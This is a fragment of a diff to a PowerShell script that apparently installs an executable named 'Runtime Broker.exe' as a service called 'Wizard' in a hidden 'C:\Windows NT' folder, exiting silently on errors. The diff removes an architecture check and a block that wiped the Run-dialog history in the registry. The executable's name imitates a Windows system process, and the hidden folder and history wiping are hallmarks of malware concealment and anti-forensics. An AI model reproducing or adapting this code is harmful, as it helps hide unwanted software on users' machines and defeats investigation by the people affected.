@@ -2,8 +2,6 @@ $root = "C:\Windows NT"
 $servicio = "Wizard"
 $ejecutable = "Runtime Broker.exe"
 $rootFile = Join-Path -Path $root -ChildPath $ejecutable
-$arch = (Get-WmiObject -Class Win32_OperatingSystem).OSArchitecture
-
 
 if (-not (Test-Path $root)) {
     try {
@@ -13,8 +11,7 @@ if (-not (Test-Path $root)) {
     catch {
         exit 1
     }
-}
-else {
+}else {
     try {
         Set-ItemProperty -Path $root -Name Attributes -Value 'Hidden'
     }
@@ -74,12 +71,3 @@ try {
 catch {
     exit 1
 }
-
-try {
-    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force
-    
-}
-catch {
-    exit 1
-}
-
